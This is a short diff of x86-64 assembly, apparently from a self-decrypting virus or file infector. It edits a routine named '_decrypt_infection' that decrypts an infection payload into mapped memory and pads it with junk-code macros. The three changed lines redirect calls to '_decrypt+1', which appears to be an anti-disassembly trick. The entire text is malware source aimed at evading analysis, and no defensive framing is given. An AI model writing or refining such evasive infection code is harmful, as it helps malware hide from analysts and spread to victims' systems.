@@ -183,7 +183,7 @@ _decrypt_infection:
 	push rsi
 	push rdx
 	push r10
-	call _decrypt ; and we call _decrypt
+	call _decrypt+1 ; and we call _decrypt
 	JUNK 5
 
 	mov rdi, QWORD [rsp + 24]
@@ -192,7 +192,7 @@ _decrypt_infection:
 	mov rdx, 128
 	mov r10, QWORD [rsp]
 	add r10, QWORD [rsp + 8]
-	call _decrypt
+	call _decrypt+1
 
 	pop r10
 	add r10, QWORD [rsp]
@@ -206,7 +206,7 @@ _decrypt_infection:
 	lea rsi, [rel _table_offset]
 	add rsi, 128
 	pop rdi
-	call _decrypt
+	call _decrypt+1
 
 ; Now we move our decrypter on our mmap directly after decrypted part + 256 (key_size)
 	mov rdi, QWORD [rsp] ; take mmap addr
